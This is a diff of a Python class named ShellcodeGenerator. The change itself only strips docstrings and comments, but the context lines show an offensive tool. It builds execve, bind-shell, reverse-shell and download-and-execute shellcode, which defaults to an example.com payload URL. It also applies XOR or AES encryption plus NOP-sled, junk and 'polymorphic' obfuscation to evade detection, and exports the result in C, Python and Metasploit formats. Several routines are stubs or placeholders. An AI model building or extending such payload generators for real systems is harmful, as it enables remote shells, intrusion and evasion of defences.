@@ -116,7 +116,6 @@ class ShellcodeGenerator:
         return list(address.packed)
 
     def _generate_base_shellcode(self, shellcode_type: str, architecture: str, custom_params: Dict = None) -> bytes:
-        """Generate base shellcode based on type and architecture"""
         if custom_params is None:
             custom_params = {}
         
@@ -127,7 +126,6 @@ class ShellcodeGenerator:
         return self._generate_x64_shellcode(shellcode_type, custom_params)
     
     def _generate_x64_shellcode(self, shellcode_type: str, custom_params: Dict) -> bytes:
-        """Generate x64 shellcode"""
         if shellcode_type == "execve":
             return self._x64_execve_shellcode(custom_params)
         elif shellcode_type == "bind_shell":
@@ -141,7 +139,6 @@ class ShellcodeGenerator:
         raise ValueError(f"shellcode type {shellcode_type!r} is not implemented for x64")
     
     def _x64_execve_shellcode(self, custom_params: Dict) -> bytes:
-        """Generate x64 execve shellcode"""
         command = custom_params.get('command', '/bin/sh')
         
         # x64 execve shellcode
@@ -173,7 +170,6 @@ class ShellcodeGenerator:
         return bytes(shellcode)
     
     def _x64_bind_shell_shellcode(self, custom_params: Dict) -> bytes:
-        """Generate x64 bind shell shellcode"""
         port = custom_params.get('port', 4444)
         
         # x64 bind shell shellcode
@@ -233,7 +229,6 @@ class ShellcodeGenerator:
         return bytes(shellcode)
     
     def _x64_reverse_shell_shellcode(self, custom_params: Dict) -> bytes:
-        """Generate Linux x64 reverse TCP shellcode with an inline sockaddr."""
         host = custom_params.get('host', '127.0.0.1')
         port = int(custom_params.get('port', 4444))
         host_bytes = self._ipv4_bytes(host)
@@ -267,13 +262,10 @@ class ShellcodeGenerator:
         return bytes(shellcode)
     
     def _x64_download_execute_shellcode(self, custom_params: Dict) -> bytes:
-        """Generate x64 download and execute shellcode"""
         url = custom_params.get('url', 'http://example.com/payload')
         
-        # Simplified download and execute shellcode
         shellcode = bytearray()
         
-        # This is a simplified version - real implementation would be much more complex
         shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
         shellcode.extend([0x48, 0x31, 0xff])  # xor rdi, rdi
         shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
@@ -286,7 +278,6 @@ class ShellcodeGenerator:
         return bytes(shellcode)
     
     def _x64_mimikatz_shellcode(self, custom_params: Dict) -> bytes:
-        """Generate x64 Mimikatz shellcode"""
         # This would contain the actual Mimikatz shellcode
         # For security reasons, we'll just return a placeholder
         shellcode = bytearray()
@@ -300,7 +291,6 @@ class ShellcodeGenerator:
         return bytes(shellcode)
     
     def _x64_generic_shellcode(self, shellcode_type: str, custom_params: Dict) -> bytes:
-        """Generate generic x64 shellcode"""
         # Generic shellcode template
         shellcode = bytearray()
         shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
@@ -313,22 +303,18 @@ class ShellcodeGenerator:
         return bytes(shellcode)
     
     def _generate_x86_shellcode(self, shellcode_type: str, custom_params: Dict) -> bytes:
-        """Generate x86 shellcode"""
         # x86 shellcode implementation would go here
         return b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x01\xb3\x00\xcd\x80'
     
     def _generate_arm_shellcode(self, shellcode_type: str, custom_params: Dict) -> bytes:
-        """Generate ARM shellcode"""
         # ARM shellcode implementation would go here
         return b'\x00\x00\xa0\xe3\x01\x00\x80\xe2\x00\x00\x00\xef'
     
     def _generate_arm64_shellcode(self, shellcode_type: str, custom_params: Dict) -> bytes:
-        """Generate ARM64 shellcode"""
         # ARM64 shellcode implementation would go here
         return b'\x00\x00\x80\xd2\x01\x00\x80\xd2\x00\x00\x00\xd4'
     
     def _apply_encryption(self, shellcode: bytes, encryption_method: str) -> bytes:
-        """Apply encryption to shellcode"""
         if encryption_method == "xor":
             return self._xor_encrypt(shellcode)
         elif encryption_method == "aes":
@@ -341,7 +327,6 @@ class ShellcodeGenerator:
             return shellcode
 
     def _xor_encrypt(self, shellcode: bytes) -> bytes:
-        """XOR encrypt shellcode"""
         key = random.randint(1, 255)
         encrypted = bytearray()
         
@@ -377,12 +362,10 @@ class ShellcodeGenerator:
         raise ValueError("RC4 executable decoder is not implemented")
     
     def _custom_encrypt(self, shellcode: bytes) -> bytes:
-        """Custom encryption method"""
         # Implement custom encryption
         return self._xor_encrypt(shellcode)
     
     def _apply_obfuscation(self, shellcode: bytes, obfuscation_method: str) -> bytes:
-        """Apply obfuscation to shellcode"""
         if obfuscation_method == "nopsled":
             return self._add_nopsled(shellcode)
         elif obfuscation_method == "garbage":
@@ -395,13 +378,11 @@ class ShellcodeGenerator:
             return shellcode
     
     def _add_nopsled(self, shellcode: bytes) -> bytes:
-        """Add NOP sled to shellcode"""
         nopsled_size = random.randint(10, 100)
         nopsled = b'\x90' * nopsled_size  # NOP instructions
         return nopsled + shellcode
     
     def _add_garbage_instructions(self, shellcode: bytes) -> bytes:
-        """Add garbage instructions to shellcode"""
         garbage_instructions = [
             b'\x48\x31\xc0',  # xor rax, rax
             b'\x48\x31\xdb',  # xor rbx, rbx
@@ -420,13 +401,11 @@ class ShellcodeGenerator:
         return bytes(obfuscated)
     
     def _add_junk_data(self, shellcode: bytes) -> bytes:
-        """Add junk data to shellcode"""
         junk_size = random.randint(5, 50)
         junk = bytes([random.randint(0, 255) for _ in range(junk_size)])
         return junk + shellcode
     
     def _polymorphic_obfuscation(self, shellcode: bytes) -> bytes:
-        """Apply polymorphic obfuscation to shellcode"""
         # This would implement actual polymorphic techniques
         # For now, combine multiple obfuscation methods
         obfuscated = self._add_nopsled(shellcode)
@@ -434,7 +413,6 @@ class ShellcodeGenerator:
         return obfuscated
     
     def _generate_decoder(self, shellcode: bytes, encryption: str, obfuscation: str) -> bytes:
-        """Generate decoder for encrypted/obfuscated shellcode"""
         if encryption == "none" and obfuscation == "none":
             return b''
         
@@ -450,7 +428,6 @@ class ShellcodeGenerator:
         return bytes(decoder)
     
     def _generate_xor_decoder(self) -> bytes:
-        """Generate XOR decoder"""
         # x64 XOR decoder
         decoder = bytearray()
         decoder.extend([0x48, 0x31, 0xc0])  # xor rax, rax
@@ -475,7 +452,6 @@ class ShellcodeGenerator:
         raise ValueError("RC4 executable decoder is not implemented")
     
     def _create_final_payload(self, decoder: bytes, shellcode: bytes) -> bytes:
-        """Create final payload with decoder and shellcode."""
         if self._last_aes_package is not None:
             return self._last_aes_package.assemble()
         if decoder:
@@ -492,12 +468,10 @@ class ShellcodeGenerator:
         }
     
     def _url_encode(self, payload: bytes) -> str:
-        """URL encode payload"""
         import urllib.parse
         return urllib.parse.quote(payload)
     
     def _c_escape(self, payload: bytes) -> str:
-        """C-style escape payload"""
         escaped = []
         for byte in payload:
             if byte < 32 or byte > 126:
@@ -507,20 +481,16 @@ class ShellcodeGenerator:
         return ''.join(escaped)
     
     def _generate_c_array(self, payload: bytes) -> str:
-        """Generate C array format"""
         hex_values = [f'0x{byte:02x}' for byte in payload]
         return 'unsigned char shellcode[] = {\n    ' + ',\n    '.join(hex_values) + '\n};'
     
     def _generate_python_bytes(self, payload: bytes) -> str:
-        """Generate Python bytes format"""
         return f'shellcode = {repr(payload)}'
     
     def _generate_metasploit_format(self, payload: bytes) -> str:
-        """Generate Metasploit format"""
         return f'payload = "{payload.hex()}"'
     
     def _load_shellcode_templates(self) -> Dict[str, Any]:
-        """Load shellcode templates"""
         return {
             'execve': {'description': 'Execute command', 'size': 'small'},
             'bind_shell': {'description': 'Bind shell', 'size': 'medium'},
